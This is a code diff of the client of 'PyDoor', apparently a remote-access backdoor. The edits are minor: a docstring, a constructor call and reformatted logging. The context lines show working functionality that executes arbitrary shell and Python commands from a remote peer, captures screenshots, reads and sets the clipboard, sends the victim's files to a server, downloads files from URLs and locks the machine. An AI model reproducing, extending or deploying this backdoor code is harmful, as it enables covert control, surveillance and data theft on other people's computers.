@@ -1,3 +1,4 @@
+""" PyDoor Client """
 import json
 import logging
 import subprocess
@@ -16,7 +17,7 @@ class Client(BaseClient):
     """ Client for managing commands """
 
     def __init__(self, certificate: x509.Certificate) -> None:
-        super().__init__(certificate)
+        BaseClient.__init__(self, certificate)
 
     def listen(self) -> None:
         """ Listen for coming commands """
@@ -44,12 +45,12 @@ class Client(BaseClient):
             case 'LOCK':
                 self.lock()
             case _:
-                logging.debug('Received unrecognized command: %s' % command)
+                logging.debug('Received unrecognized command: %s', command)
 
     def shell(self) -> None:
         """ Open a shell for peer """
         command = self.read().decode()
-        logging.info('Executing shell command: %s' % command)
+        logging.info('Executing shell command: %s', command)
         process = subprocess.Popen(
             command,
             stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
@@ -60,7 +61,7 @@ class Client(BaseClient):
     def interpreter(self) -> None:
         """ Open python interpreter for peer """
         command = self.read().decode()
-        logging.info('Executing python command: %s' % command)
+        logging.info('Executing python command: %s', command)
         error_message = ''
 
         with redirect_stdout(StringIO()) as output:
@@ -77,8 +78,8 @@ class Client(BaseClient):
         try:
             data = screen.screenshot()
         except Exception as error:
-            error_message = '%s: %s' % (error.__class__.__name__, str(error))
-            logging.error('Error taking screenshot: ' + error_message)
+            error_message = f'{error.__class__.__name__}: {str(error)}'
+            logging.error('Error taking screenshot: %s', error_message)
             data = ('ERROR: ' + error_message).encode()
         else:
             logging.info('Successfully captured screenshot')
@@ -103,10 +104,10 @@ class Client(BaseClient):
         try:
             clipboard.copy(data)
         except RuntimeError as error:
-            logging.error('Error occurred copying to clipboard: %s' % str(error))
+            logging.error('Error occurred copying to clipboard: %s', str(error))
             self.write(str(error).encode())
         else:
-            logging.info('Copied "%s" to clipboard' % data)
+            logging.info('Copied "%s" to clipboard', data)
             self.write(b'SUCCESS')
 
     def paste(self) -> None:
@@ -117,11 +118,11 @@ class Client(BaseClient):
             if data is None:
                 raise clipboard.pyperclip.PyperclipException('Clipboard is empty.')
         except RuntimeError as error:
-            logging.error('Error occurred pasting from clipboard: %s' % str(error))
+            logging.error('Error occurred pasting from clipboard: %s', str(error))
             self.write(b'ERROR')
             self.write(str(error).encode())
         else:
-            logging.info('Pasted "%s" from clipboard' % data)
+            logging.info('Pasted "%s" from clipboard', data)
             self.write(data.encode())
 
     def send_file(self) -> None:
@@ -137,12 +138,12 @@ class Client(BaseClient):
                     self.write(block)
 
         except (FileNotFoundError, PermissionError) as error:
-            logging.error('Error opening file %s: %s' % (filename, str(error)))
+            logging.error('Error opening file %s: %s', filename, str(error))
             self.write(b'ERROR')
             self.write(f'{error.__class__.__name__}: {str(error)}'.encode())
         else:
             self.write(b'FILE_TRANSFER_DONE')
-            logging.info('Successfully transferred file %s to server' % str(filename))
+            logging.info('Successfully transferred file %s to server', str(filename))
 
     def receive_file(self) -> None:
         """ Receive file from server """
@@ -158,7 +159,7 @@ class Client(BaseClient):
                     file.write(block)
 
         except (PermissionError) as error:
-            logging.error('Error receiving file from server: %s' % str(error))
+            logging.error('Error receiving file from server: %s', str(error))
             self.write(f'{error.__class__.__name__}: {str(error)}')
 
     def download(self) -> None:
@@ -169,10 +170,10 @@ class Client(BaseClient):
         try:
             download.download(url, filename)
         except RuntimeError as error:
-            logging.error("Error downloading file from the web: %s" % str(error))
+            logging.error("Error downloading file from the web: %s", str(error))
             self.write(str(error).encode())
         else:
-            logging.info("Saved downloaded file from '%s' as '%s'" % (url, filename))
+            logging.info("Saved downloaded file from '%s' as '%s'", url, filename)
             self.write(b'Success')
 
     def lock(self) -> None:
@@ -182,10 +183,10 @@ class Client(BaseClient):
         try:
             windows.lock()
         except AttributeError as error:
-            logging.error("Could not lock machine: %s" % str(error))
+            logging.error("Could not lock machine: %s", str(error))
             self.write(b"Locking is only supported on Windows.")
         except OSError as error:
-            logging.error("Could not lock machine: %s" % str(error))
+            logging.error("Could not lock machine: %s", str(error))
             self.write(str(error).encode())
         else:
             logging.info("Locked machine")
